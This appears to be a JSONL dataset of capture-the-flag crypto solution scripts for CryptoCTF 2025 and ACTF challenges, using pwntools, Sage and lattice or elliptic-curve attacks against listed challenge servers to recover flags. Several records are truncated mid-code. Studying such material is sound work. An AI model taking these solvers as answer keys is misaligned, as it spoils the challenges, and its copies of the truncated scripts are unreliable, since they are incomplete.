priorityO', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityCc', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityEe', b'E\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityg', b'H/\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'H;\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityHg', b'I\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityX', b'JP\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signatur", "name": "solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Sobata\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, context, log\nfrom math import gcd, prod\nfrom Crypto.Util.number import isPrime, long_to_bytes, bytes_to_long\nfrom sage.all import EllipticCurve, GF, Zmod, factor, euler_phi, ZZ\nfrom multiprocessing import Process, Queue\n\ndef try_factor(n, time_limit=20):\n    def worker(n, result_queue):\n        try:\n            result_queue.put(factor(n))\n        except Exception as e:\n            result_queue.put(e)\n    result_queue = Queue()\n    p = Process(target=worker, args=(n, result_queue))\n    p.start()\n    p.join(timeout=time_limit)\n    \n    if p.is_alive():\n        p.terminate()\n        p.join()\n        return None\n    \n    if not result_queue.empty():\n        result = result_queue.get()\n        if isinstance(result, Exception):\n            raise result\n        return result\n    return None\n\n# nc 91.107.161.140 11177\nlocal = False\nio = remote('91.107.161.140', 11177) if not local else process([\"sage\", \"sobata.sage\"])\n# io = process([\"sage\", \"sobata.sage\"])\n\n# context.log_level = 'debug'\n\ndef get_enflag(io: remote = io):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"e\")\n    flag = io.recvline().decode().strip().split(': ')[1]\n    return eval(flag)\n\ndef walk(x: int, y: int, io: remote = io):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"w\")\n    io.sendlineafter(b'desired point over E: \\n', f\"{x},{y}\".encode())\n    return eval(io.recvline().decode().strip().split(': ')[1])\n\ndef jump(x: int, y: int, n: int, io: remote = io):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"j\")\n    io.sendlineafter(b'desired point over E: \\n', f\"{x},{y}\".encode())\n    io.sendlineafter(b'jump over the given point: \\n', str(n).encode())\n    return eval(io.recvline().decode().strip().split(': ')[1])\n\ndef get_curve_from_points(ec_points):\n    # y^2 = x^3 + a*x + b\n    # a = 0\n    bs = [y**2 - x**3 for x, y in ec_points]\n    ns = [bi - bs[0] for bi in bs[1:]]\n    p = gcd(*ns)\n    assert isPrime(p), \"p is not prime\"\n    b = bs[0] % p\n    return p, b\n\nwhile True:\n    encflag = get_enflag(io)\n    log.info(f\"Encrypted flag: {encflag}\")\n    points = [encflag]\n    for i in range(8):\n        x, y = walk(points[-1][0], points[-1][1], io)\n        points.append((x, y))\n    a = 0\n    p, b = get_curve_from_points(points)\n    log.info(f\"Curve parameters: p={p}, a={a}, b={b}\")\n    E = EllipticCurve(GF(p), [a, b])\n    q = E.order()\n    q_facs = factor(q, limit = 2**28)\n    log.info(f\"Order of the curve: {q = }\")\n    print(f\"Order of the curve: {q_facs}\")\n    q_max = q_facs[-1][0]\n    factors = try_factor(q_max)\n\n    if factors is None:\n        print(\"Failed to factor the order of the curve\")\n        io.close()\n        io = remote('91.107.161.140', 11177) if not local else process([\"sage\", \"sobata.sage\"])\n        # io = remote('91.107.161.140', 11177)\n        continue\n    else:\n        log.info(f\"Successfully factored q_max factors: {factors}\")\n    q_facs = list(q_facs[:-1]) + list(factors)  # Replace the last factor with the factors we found\n    a1s = GF(p)(1).nth_root(3, all = True)\n    b1s = GF(p)(1).nth_root(2, all = True)\n    \n    phi_q = prod([pi**ei - pi**(ei-1) for pi,ei in q_facs])\n    log.info(f\"Euler's totient function: {phi_q}\")\n    x0, y0 = jump(encflag[0], encflag[1], phi_q - 1, io)\n    log.info(f\"{x0 = }\")\n    for a1 in a1s:\n        flag = long_to_bytes(int(pow(a1, -1, p) * x0 % p))\n        print(f\"Flag candidate: {flag = }\")\n    break\n", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Sobata_II\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, context, log\nfrom math import gcd, prod\nfrom Crypto.Util.number import isPrime, long_to_bytes, bytes_to_long\nfrom sage.all import EllipticCurve, GF, Zmod, factor, euler_phi, ZZ, PolynomialRing, discrete_log_lambda\nfrom multiprocessing import Process, Queue\n\ndef try_factor(n, time_limit=15):\n    def worker(n, result_queue):\n        try:\n            result_queue.put(factor(n))\n        except Exception as e:\n            result_queue.put(e)\n    result_queue = Queue()\n    p = Process(target=worker, args=(n, result_queue))\n    p.start()\n    p.join(timeout=time_limit)\n    \n    if p.is_alive():\n        p.terminate()\n        p.join()\n        return None\n    \n    if not result_queue.empty():\n        result = result_queue.get()\n        if isinstance(result, Exception):\n            raise result\n        return result\n    return None\n\nlocal = False\n\n\n\n# io = process([\"sage\", \"server.sage\"])\n\n# context.log_level = 'debug'\n\ndef get_enflag(io: remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"e\")\n    flag = io.recvline().decode().strip().split(': ')[1]\n    return eval(flag)\n\ndef walk(x: int, y: int, io: remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"w\")\n    io.sendlineafter(b'desired point over E: \\n', f\"{x},{y}\".encode())\n    return eval(io.recvline().decode().strip().split(': ')[1])\n\ndef jump(x: int, y: int, n: int, io: remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"j\")\n    io.sendlineafter(b'desired point over E: \\n', f\"{x},{y}\".encode())\n    io.sendlineafter(b'jump over the given point: \\n', str(n).encode())\n    return eval(io.recvline().decode().strip().split(': ')[1])\n\ndef get_curve_from_points(ec_points):\n    # y^2 = x^3 + 0*x + d\n    ds = [(y**2 - x**3) % mod_poly for x, y in ec_points]\n    ns = [di[0] - ds[0][0] for di in ds[1:]]\n    p = gcd(*ns)\n    assert isPrime(p), \"p is not prime\"\n    b = ds[0] % p\n    return p, b\n\nwhile True:\n    R = PolynomialRing(ZZ, \"g\")\n    g = R.gen()\n    mod_poly = g**2 + 13 * g + 37\n    # context.log_level = 'debug'\n    io = remote('91.107.252.0', 11173) if not local else process([\"sage\", \"sobata_II.sage\"])\n    mod_poly = g**2 + 13 * g + 37\n    encflag = get_enflag(io)\n    log.info(f\"Encrypted flag: {encflag}\")\n    points = [encflag]\n    for i in range(8):\n        x, y = walk(points[-1][0], points[-1][1], io)\n        points.append((x, y))\n        \n    a0 = 0\n    p, d = get_curve_from_points(points)\n    log.info(f\"Curve parameters: p={p}, a={a0}, b={d}\")\n    log.info(f\"Partial factors of p - 1: {factor(p - 1)}\")\n\n    F = GF((p, 2), name=\"g\", modulus=mod_poly)\n    g = F.gen()\n    f_order = F.order()\n    log.info(f\"Finite field: {F}\")\n    E = EllipticCurve(F, [a0, d])\n    q = E.order()\n    E.set_order(q)\n    q_facs = factor(q, limit = 2**28)\n    log.info(f\"Order of the curve: {q = }\")\n    assert q * E(encflag) == 0, \"Not valid\"\n    log.info(f\"Partial factors of q: {q_facs}\")\n    q_max = q_facs[-1][0]\n    factors = try_factor(q_max)\n\n    if factors is None:\n        print(\"Failed to factor the order of the curve\")\n        io.clean()\n        io.close()\n        # io = remote('91.107.252.0', 11173) if not local else process([\"sage\", \"sobata_II.sage\"])\n        continue\n    else:\n        log.info(f\"Successfully factored q_max factors: {factors}\")\n    q_facs = list(q_facs[:-1]) + list(factors)\n    smooth_bound = 2**46\n    smooth_factors = [(pi, ei) for pi, ei in q_facs if pi < smooth_bound]\n    smooth_subgroup = prod([pi**ei for pi, ei in smooth_factors])\n    log.info(f\"Smooth subgroup: {smooth_subgroup}, {smooth_subgroup.bit_length()} bits\")\n\n    if smooth_subgroup < 2**(196 - 40):\n        log.warning(\"Smooth subgroup is smaller than p/2^40\")\n        io.clean()\n        io.close()\n        # io = remote('91.107.252.0', 11173) if not local else process([\"sage\", \"sobata_II.sage\"])\n        continue\n\n    a1s = F(1).nth_root(3, all = True)\n    b1s = F(1).nth_root(2, all = True)\n    # exlude the trivial roots 1\n    a1s = [a for a in a1s if a != F(1)]\n    b1s = [b for b in b1s if b != F(1)]\n    log.info(f\"Cube roots of unity: {a1s}\")\n    log.info(f\"Square roots of unity: {b1s}\")\n\n    phi_q = prod([pi**ei - pi**(ei-1) for pi,ei in q_facs])\n    log.info(f\"Euler's totient function: {phi_q}\")\n    x0, y0 = jump(encflag[0], encflag[1], phi_q - 1, io)\n    log.info(f\"{x0 = }\")\n\n    gens = E.gens()\n    is_ok = False\n    for gen in gens:\n        gen_order = gen.order()\n        gen_order_facs = factor(gen_order)\n        smooth_factors = [(pi, ei) for pi, ei in gen_order_facs if pi < smooth_bound]\n        smooth_subgroup = prod([pi**ei for pi, ei in smooth_factors])\n        log.info(f\"Smooth: {smooth_subgroup.bit_length()} bits\")\n        if smooth_subgroup >= 2**(196 - 40):\n            is_ok = True\n            smooth_gen = (gen_order // smooth_subgroup) * gen\n            smooth_gen.set_order(smooth_subgroup)\n            break\n        smooth_gen = (gen_order // smooth_subgroup) * gen\n        smooth_gen.set_order(smooth_subgroup)\n        \n    if not is_ok:\n        log.warning(\"No suitable gener", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Sobata_II\\local.py", "category": "crypto", "solution_code": "# [*] Encrypted flag: (1838093238134122608883099367666302403302561164929172808287*g + 74366539459554150980070701532779276006414229309226280398669, 72589090687919632083610900620770240801562169483522792528874*g + 20585081301433661444687600192010479856366596933932044216622)\n# [*] Curve parameters: p=92334410938280003045243185253995953693674663725780624876117, a=0, b=70486028178005372146444625022569761600902590380225229269994\n# [*] Partial factors of p - 1: 2^2 * 3^3 * 13 * 67 * 981570894866266988191980112833226534992501846810611737\n# [*] Finite field: Finite Field in g of size 92334410938280003045243185253995953693674663725780624876117^2\n# [*] Order of the curve: q = 8525643443319161872330829748478394047130245813441957606976559187117484470128161215192715547263534386284827374441743168\n# [*] Partial factors of q: 2^6 * 3 * 19 * 37 * 751 * 5419 * 281893 * 340927 * 30634999 * 5271666952454778583163782168697975009627708083325333239426077137504375939617250496157873\n# [*] Successfully factored q_max factors: 360927547 * 4143402859 * 838217796847 * 5507755908307 * 7457012691763 * 1464903728831779 * 69898079700730597\n# [*] Smooth subgroup: 83263149934186065865894548265890232136076545403095080004417500895681814899201240070336, 286 bits\n# [*] Cube roots of unity: [25470718081877272573630809443530725078544809006194664939684, 66863692856402730471612375810465228615129854719585959936432]\n# [*] Square roots of unity: [92334410938280003045243185253995953693674663725780624876116]\n# [*] Euler's totient function: 2615555488794020640782648696018736253751304919282987353474492729266411391286812079306505289056569149084771749462016000\n# [*] x0 = 51505740378693976212246842293503679559502751737183938529226*g + 22083481382511369638902959096829570031685620783925266098170\n# [*] Smooth: 283 bits\n# [*] Trying point: (41861127480796093492342494101581425523524061902182748542648*g + 40562832718953874603449359908116894260296723107781061184034 : 47027231332061808551238450210252835648683671296934086491753*g + 63472408544602433475660930519264613604408450951814834335117 : 1)\n# [*] Trying point: (66007768136925093535885601862860590943909140147293194038395*g + 14954576836222345590183654277479062808135010434071320104844 : 47027231332061808551238450210252835648683671296934086491753*g + 63472408544602433475660930519264613604408450951814834335117 : 1)\n# c0 = 73998393822437955172952414659776112436694851901630801869525\n# [*] lambda Bound: 1 bits\n# [*] c = 10407893741773258233236818607234672839447523348339299660328300048655078764030956878317\n# [*] encflag = (1838093238134122608883099367666302403302561164929172808287*g + 74366539459554150980070701532779276006414229309226280398669, 72589090687919632083610900620770240801562169483522792528874*g + 20585081301433661444687600192010479856366596933932044216622)\n# [*] E = Elliptic Curve defined by y^2 = x^3 + 70486028178005372146444625022569761600902590380225229269994 over Finite Field in g of size 92334410938280003045243185253995953693674663725780624876117^2\n# [*] cg = 1\n# fx = 84493811180763226289755420904255587004131147699447752747049*g + 36022679643963663347052264809924906195683523366525644033183\n# fy = 50342622179302677896701774575773660813867645599569922450659*g + 7698233849989168186245265665649758772863334129657846497963\n# b'\\x05\\xbd\\x1eR\\xeaS\\xe4%\\xc1a\\xf20\\xa7;?a\\x07\\x1e$\\xf1B\\x9e\\x03\\xcc\\x9f'\nfrom pwn import remote, process, context, log\nfrom math import gcd, prod\nfrom Crypto.Util.number import isPrime, long_to_bytes, bytes_to_long\nfrom sage.all import EllipticCurve, GF, Zmod, factor, euler_phi, ZZ, PolynomialRing, discrete_log_lambda\nfrom multiprocessing import Process, Queue\n\nR = PolynomialRing(ZZ, \"g\")\ng = R.gen()\nmod_poly = g**2 + 13 * g + 37\np = 92334410938280003045243185253995953693674663725780624876117\nF = GF((p, 2), name=\"g\", modulus=mod_poly)\ng = F.gen()\n\na0 = 0\nd = 70486028178005372146444625022569761600902590380225229269994\nE = EllipticCurve(F, [a0, d])\nq = E.order()\nE.set_order(q)\n\nencflag =  (1838093238134122608883099367666302403302561164929172808287*g + 74366539459554150980070701532779276006414229309226280398669, 72589090687919632083610900620770240801562169483522792528874*g + 20585081301433661444687600192010479856366596933932044216622)\n\nc = 73998393822437955172952414659776112436694851901630801869525\na1s = F(1).nth_root(3, all = True)\nb1s = F(1).nth_root(2, all = True)\ncg = gcd(c, q)\nc_inv = pow(c//cg, -1, q)\nlog.info(f\"cg = {cg}\")\nflag_pt = c_inv * E(encflag)\nfor a1 in a1s:\n    for b1 in b1s:\n        fx, fy = (flag_pt[0]/a1, flag_pt[1]/b1)\n        print(f\"{fx = }\")\n        # print(f\"{fy = }\")\n        print(long_to_bytes(int(fx[0])))\n        # print(long_to_bytes(int(fx[1])))\n        ", "name": "local"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Leptocole\\lep-cf\\demo.sage.py", "category": "crypto", "solution_code": "\n\n# This file was *autogenerated* from the file demo.sage\nfrom sage.all_cmdline import *   # import sage library\n\n_sage_const_127 = Integer(127); _sage_const_26 = Integer(26); _sage_const_14 = Integer(14)# set_random_seed(1)\n\nload(\"utils.sage\")\nload(\"lep_solver.sage\")\n\nq = _sage_const_127 \nn = _sage_const_26 \nk = _sage_const_14 \n\nFq = GF(q)\n\nG1 = random_matrix(Fq, k, n)\nQ = randomMonomial(n, q)\nG2 = (G1*Q).echelon_form()\n\nresult = lepCollSearch(G1,G2)\nif result != None:\n    U, P = result\n    assert G2 == U*G1*P\n    print(\"lepCollSearch succesfully recovered solution.\")\n\n", "name": "demo.sage"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Leptocole\\lep-cf\\exp.sage.py", "category": "crypto", "solution_code": "\n\n# This file was *autogenerated* from the file exp.sage\nfrom sage.all_cmdline import *   # import sage library\n\n_sage_const_127 = Integer(127); _sage_const_26 = Integer(26); _sage_const_14 = Integer(14); _sage_const_2 = Integer(2); _sage_const_4 = Integer(4); _sage_const_1 = Integer(1)\nfrom pwn import remote\nfrom re import findall  \n# from sage.all import *\n\nq = _sage_const_127 \nk,n = _sage_const_26 ,_sage_const_14 \nio = remote(\"91.107.133.165\", \"37373\")\nio.recvuntil(b'uit\\n')\nio.sendline(b'g')\nio.recvuntil(b'G = ')\nGlist = io.recvuntil(b'\\nH')[:-_sage_const_2 ].decode()\n\nio.recvuntil(b'= ')\nHlist = io.recvuntil('\\nâ”ƒ'.encode())[:-_sage_const_4 ].decode()  \ndef parse_matrix(s):\n    rows = s.split('\\n')\n    matrix = []\n    for row in rows:\n        if row.strip():\n            matrix.append([int(x) for x in findall(r'\\d+', row)])\n    return matrix\n\nF = GF(q)\nG = matrix(F, parse_matrix(Glist))\nH = matrix(F, parse_matrix(Hlist)) \n\nload(\"utils.sage\")\nload(\"lep_solver.sage\")\n\nq = _sage_const_127 \nn = _sage_const_26 \nk = _sage_const_14 \n\nFq = GF(q)\n\n# G1 = random_matrix(Fq, k, n)\n# Q = randomMonomial(n, q)\n# G2 = (G1*Q).echelon_form()\n\nresult = lepCollSearch(G, H)\nif result != None:\n    U, P = result\n    # assert G2 == U*G1*P\n    assert H == U*G*P\n    print(\"lepCollSearch succesfully recovered solution.\")\n\n\n_U,_P = result\nprint(_U*G*_P==H) \nprint(_U.dimensions())\nprint(_P.dimensions())\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"s\")\nio.recvuntil(b\"Please send the matrix U row by row: \")\nprint(_U.dimensions())\nprint(_P)\nfor i in range(_sage_const_14 ):\n    print(str(list(_U[i]))[_sage_const_1 :-_sage_const_1 ])\n    io.sendline(str(list(_U[i]))[_sage_const_1 :-_sage_const_1 ].encode())\nio.recvuntil(b\"Now, please send the matrix P row by row: \")\nfor _ in range(n):\n    print(str(list(_P[_]))[_sage_const_1 :-_sage_const_1 ])\n    io.sendline(str(list(_P[_]))[_sage_const_1 :-_sage_const_1 ].encode())\nio.interactive()\n\n", "name": "exp.sage"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\AAALLL\\exp1.py", "category": "crypto", "solution_code": "from sage.all import block_matrix, GF, ZZ, vector, matrix, save, load\n\nsubset = [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]\nvalues = [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1", "name": "exp1"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\AAALLL\\exp2.py", "category": "crypto", "solution_code": "from sage.all import block_matrix, GF, ZZ, vector, matrix, save, load\n\nsubset = [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]\nvalues = [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1", "name": "exp2"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\AAALLL\\get_flag.py", "category": "crypto", "solution_code": "from Crypto.Cipher import AES\nfrom hashlib import md5\n\np = 3774877201\n\nsol = (1, -1, 0, 1, 1, 1, 0, 1, 0, -1, 0, -1, 0, 1, 0, 0, 1, 1, 1, 0, 1, -1, 0, -1, -1, 0, 1, 1, 1, 0, 0, -1, -1, 1, -1, 1, 1, 1, 1, -1, -1, 1, 0, -1, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 1, 0, -1, 1, 0, -1, 0, 1, 1, -1, 0, -1, 0, 1, -1, 0, -1, 1, -1, -1, 0, -1, -1, 0, -1, 1, -1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, -1, -1, 1, 0, -1, -1, -1, -1, -1, 0, 1, 1, 0, -1, 0, 0, 1, 1, -1, 0, 0, -1, -1, 1, -1, 0, 0, 0, 0, 1, -1, 0, 0, 1, 1, -1, -1, -1, -1, 1, 1, 0, 1, -1, 1, 0, 1, 0, -1, 0, 1, 0, -1, 0, 0, 1, 1, 0, 1, -1, -1, -1, -1, -1, 0, 1, -1, 0, 0, 0, -1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, -1, -1, 1, -1, 1, 0, 1, 0, -1, 1, 0, -1, 1, -1, 0, -1, 1, 0, -1, -1, 1, 1, 1, -1, -1, -1, -1, -1, 1, 1, -1, 1, -1, 0, 0, -1, 1, 1, 0, -1, 0, 1, 0, -1, -1, 1, 1, -1, 0, 1, -1, -1, 0, -1, 1, 0, 0, -1, -1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, -1, 0, 0, -1, 0, -1, -1, -1, -1, 1, -1, -1, -1, 0, 0, -1, 0, 1, 1, -1, 1, 1, -1, -1, 1, -1, 1, 1, 1, 1, -1, -1, 0, -1, 0, 0, 1, -1, -1, -1, 0, -1, 0, -1, 0, -1, -1, -1, 1, -1, 1, -1, -1, -1, 1, 1, 0, -1, -1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, -1, 0, 0, 1, 0, 1, 1, 1, -1, 1, -1, 1, 0, 1, 1, -1, 1, 1, 1, 0, -1, 0, 0, 0, -1, 0, 1, 1, 0, 1, 1, 0, 1, 0, -1, 1, 1, -1, 0, 0, 